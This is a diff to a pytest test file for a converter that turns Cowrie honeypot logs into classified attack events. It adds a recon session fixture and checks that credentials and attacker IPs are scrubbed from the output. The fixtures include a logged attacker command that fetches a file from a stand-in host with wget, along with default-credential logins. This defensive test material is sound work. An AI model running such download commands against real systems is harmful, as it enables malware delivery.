@@ -4,6 +4,7 @@ import sys
 
 import pytest
 
+from backend.classify.session import read_records
 from backend.sources import ReplaySource
 from tools import convert_cyberlab
 from tools.convert_cyberlab import ConversionError, convert, convert_sessions, unzipped_size
@@ -45,6 +46,13 @@ SESSIONS = {
         event("cowrie.command.success", "2019-05-18T02:00:05.000000Z",
               message="Command found: wget http://203.0.113.9/x"),
     ],
+    "recon": [
+        event("cowrie.login.success", "2019-05-18T02:30:00.000000Z",
+              username="pi", password="raspberry-secret",
+              message="login attempt [pi/raspberry-secret] succeeded"),
+        event("cowrie.command.success", "2019-05-18T02:30:05.000000Z",
+              message="Command found: uname -a"),
+    ],
     "download": [
         event("cowrie.login.success", "2019-05-18T03:00:00.000000Z",
               username="admin", password="x"),
@@ -63,9 +71,9 @@ def converted():
 
 def test_sessions_become_events_in_time_order_with_plain_ids():
     events, counts = converted()
-    assert [e.id for e in events] == [f"evt_00000{n}" for n in range(1, 6)]
+    assert [e.id for e in events] == [f"evt_00000{n}" for n in range(1, 7)]
     assert [e.ts for e in events] == sorted(e.ts for e in events)
-    assert counts["written"] == 5
+    assert counts["written"] == 6
     assert counts["skipped_no_location"] == 1
 
 
@@ -74,7 +82,8 @@ def test_each_kind_of_session_gets_the_matching_attack_type_and_detail():
     summary = [(e.attack_type, e.detail, e.username) for e in events]
     assert summary == [
         ("ssh_bruteforce", "login attempt as jay", "jay"),
-        ("ssh_bruteforce", "login as root, then commands were run", "root"),
+        ("malware_dropper", "fetch command run after login as root", "root"),
+        ("ssh_bruteforce", "login as pi, then commands were run", "pi"),
         ("malware_dropper", "file fetched after login as admin", "admin"),
         ("ssh_bruteforce", "login attempt", None),
         ("port_scan", "connection with no login attempt", None),
@@ -92,7 +101,8 @@ def test_events_are_marked_as_real_data_with_the_credit():
 
 def test_nothing_sensitive_reaches_the_output():
     text = "\n".join(e.model_dump_json() for e in converted()[0])
-    for secret in ("hunter2secret", "toor-secret", "203.0.113.9", "SECRETHASH", "SECRETMESSAGE"):
+    secrets = ("hunter2secret", "toor-secret", "raspberry-secret", "203.0.113.9", "SECRETHASH")
+    for secret in (*secrets, "SECRETMESSAGE"):
         assert secret not in text
 
 
@@ -106,9 +116,11 @@ def test_a_converted_file_loads_in_the_replay_source(tmp_path):
     with gzip.open(source, "wt", encoding="utf-8") as handle:
         json.dump([{sid: events} for sid, events in SESSIONS.items()], handle)
     destination = tmp_path / "replay.jsonl"
-    counts = convert(source, destination)
-    assert counts["sessions"] == 6
+    sessions = tmp_path / "sessions.jsonl"
+    counts = convert(source, destination, sessions)
+    assert counts["sessions"] == 7
     assert ReplaySource(destination).mode == "replayed"
+    assert [r.event_id for r in read_records(sessions)] == [f"evt_00000{n}" for n in range(1, 7)]
 
 
 def test_the_size_of_a_gzip_file_is_read_from_its_trailer(tmp_path):
